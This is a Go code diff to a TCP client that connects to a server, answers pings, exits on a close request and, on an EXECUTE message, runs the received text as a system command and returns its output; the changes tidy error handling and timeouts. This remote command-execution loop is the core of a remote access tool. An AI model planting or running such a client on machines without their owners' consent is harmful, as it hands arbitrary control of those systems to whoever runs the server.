@@ -28,7 +28,7 @@ func NewClient(addr, port string) (Client, error) {
 
 func (client *Client) Communicate() {
 	defer client.tryNotifyAndClose()
-	client.Conn.SetDeadline(time.Time{})
+	client.Conn.SetReadDeadline(time.Time{})
 	go client.handleReceives()
 
 	// Prevents the process from exiting right away
@@ -47,8 +47,7 @@ func (client *Client) handleReceives() {
 
 		switch err {
 		case net.ErrClosed:
-			// TODO (idk what to do)
-			continue
+			client.tryNotifyAndClose()
 		}
 
 		receivedReq := network.ParseIntoRequest(buffer[:n])
@@ -59,21 +58,21 @@ func (client *Client) handleReceives() {
 func (client *Client) processRequestAndSendResponse(req network.Request) {
 	switch req.Status {
 	case network.PING:
-		println("Ping received.") // DEBUG
+		// TODO
 	case network.REQUESTING_CLOSE:
 		os.Exit(0)
-	case network.REDIRECT:
-		// TODO
-		// Maybe freeze all goroutines till it redirects successfully
 	case network.EXECUTE:
 		rawCommand := strings.TrimSuffix(req.Payload, "\n")
 		command, params := parseIntoCommandAndParams(rawCommand)
 		out, err := exec.Command(command, params...).Output()
+		statusCode := network.OUTPUT
 
 		if err != nil {
-			client.send(network.OUTPUT_WITH_ERROR, out)
-		} else {
-			client.send(network.OUTPUT, out)
+			statusCode = network.OUTPUT_WITH_ERROR
+		}
+
+		if err := client.send(statusCode, out); err != nil {
+			client.tryNotifyAndClose()
 		}
 	}
 }
@@ -84,9 +83,9 @@ func (client *Client) send(
 ) error {
 	payload := []byte{statusCode}
 	payload = append(payload, bytes...)
-
+	client.Conn.SetWriteDeadline(time.Now().Add(writeTimeLimit))
 	if _, err := client.Conn.Write(payload); err != nil {
-		// TODO (idk what to do)
+		return err
 	}
 
 	return nil
